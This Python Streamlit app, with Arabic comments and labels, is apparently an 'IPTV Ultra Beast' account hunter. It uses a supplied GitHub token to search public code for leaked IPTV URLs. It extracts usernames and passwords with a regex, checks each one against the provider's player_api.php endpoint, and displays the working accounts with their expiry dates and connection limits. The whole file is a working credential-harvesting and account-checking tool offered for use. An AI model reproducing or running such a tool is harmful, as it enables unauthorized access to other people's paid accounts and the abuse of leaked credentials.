import streamlit as st
import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =================================================
# 1. إعدادات الأمان (كلمة المرور)
# =================================================
LOGIN_PASSWORD = "BEAST_V14_USER" # يمكنك تغييرها هنا

def check_password():
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False
    if st.session_state.password_correct:
        return True

    st.markdown("<h2 style='text-align: center;'>🔐 نظام IPTV Ultra Beast</h2>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كلمة المرور:", type="password")
    if st.button("دخول"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else:
            st.error("❌ خطأ!")
    return False

if not check_password():
    st.stop()

# =================================================
# 2. إعدادات الواجهة والتصميم
# =================================================
st.set_page_config(page_title="Ultra Beast Live Scanner", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #0c0e12; }
    .card {
        background: linear-gradient(145deg, #1a1d23, #14161a);
        border: 1px solid #2d323b;
        border-left: 5px solid #00ff41;
        padding: 20px;
        border-radius: 10px;
        margin-bottom: 15px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }
    .host-text { color: #00e676; font-weight: bold; font-size: 1.1em; }
    .info-label { color: #8b949e; font-size: 0.9em; }
    .info-value { color: #ffffff; font-family: 'Courier New', monospace; }
    .badge {
        background-color: #00ff41; color: #000;
        padding: 2px 8px; border-radius: 4px;
        font-weight: bold; font-size: 0.8em;
    }
</style>
""", unsafe_allow_html=True)

# إدارة الحالة (Session State)
if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0

# =================================================
# 3. محرك الفحص الذكي
# =================================================

def check_account(host, user, pw):
    try:
        url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(url, timeout=3).json()
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            return {"host": host, "user": user, "pass": pw, "exp": exp, "conn": f"{info.get('active_cons')}/{info.get('max_connections')}"}
    except: return None

# =================================================
# 4. واجهة التحكم (Sidebar)
# =================================================
with st.sidebar:
    st.title("🌪️ Ultra Beast V14")
    token = st.text_input("GitHub Token:", type="password")
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 ابدأ", use_container_width=True):
            if token: st.session_state.is_hunting = True
            else: st.warning("أدخل التوكن!")
    with col2:
        if st.button("🛑 توقف", use_container_width=True):
            st.session_state.is_hunting = False

    st.divider()
    st.metric("🔍 تم فحص", st.session_state.checked_count)
    st.metric("💎 النتائج", len(st.session_state.results))

# =================================================
# 5. منطقة العرض المباشر (Main Content)
# =================================================
st.subheader("📡 نتائج الصيد المباشر")
results_area = st.container()

# وظيفة التحديث الفوري للنتائج على الشاشة
def update_display():
    with results_area:
        # نعرض النتائج بشكل عكسي (الأحدث في الأعلى)
        for item in st.session_state.results:
            st.markdown(f"""
            <div class="card">
                <span class="badge">ACTIVE ✅</span>
                <div style="margin-top:10px;">
                    <span class="host-text">{item['host']}</span>
                </div>
                <hr style="border:0.5px solid #2d323b; margin:10px 0;">
                <div style="display: flex; justify-content: space-between;">
                    <div>
                        <span class="info-label">USER:</span> <span class="info-value">{item['user']}</span><br>
                        <span class="info-label">PASS:</span> <span class="info-value">{item['pass']}</span>
                    </div>
                    <div style="text-align: right;">
                        <span class="info-label">EXP:</span> <span class="info-value">{item['exp']}</span><br>
                        <span class="info-label">CONN:</span> <span class="info-value">{item['conn']}</span>
                    </div>
                </div>
            </div>
            """, unsafe_allow_html=True)

# منطق البحث الفعلي
if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}'}
    dorks = ['extension:txt "get.php?username="', 'filename:iptv.txt', '"player_api.php" user pass']
    
    # مكان مخصص لعرض حالة البحث الحالية (بدون تكرار)
    status_msg = st.empty()

    for dork in dorks:
        if not st.session_state.is_hunting: break
        for page in range(1, 5):
            if not st.session_state.is_hunting: break
            status_msg.info(f"🔎 جاري البحث عن: {dork} (صفحة {page})")
            
            try:
                res = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}", headers=headers).json()
                if 'items' in res:
                    for item in res['items']:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        content = requests.get(raw_url, timeout=3).text
                        matches = re.findall(r"(http://[\w\.-]+:\d+)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                        
                        for m in matches:
                            st.session_state.checked_count += 1
                            found = check_account(m[0], m[1], m[2])
                            if found:
                                # إضافة النتيجة للقائمة إذا لم تكن موجودة
                                if found not in st.session_state.results:
                                    st.session_state.results.insert(0, found)
                                    st.toast("🎯 تم صيد حساب جديد!", icon="💎")
                                    update_display() # تحديث الواجهة فوراً
            except: continue
    
    st.session_state.is_hunting = False
    st.success("✅ اكتملت دورة البحث.")
else:
    # عرض النتائج المحفوظة إذا كان المحرك متوقفاً
    update_display()
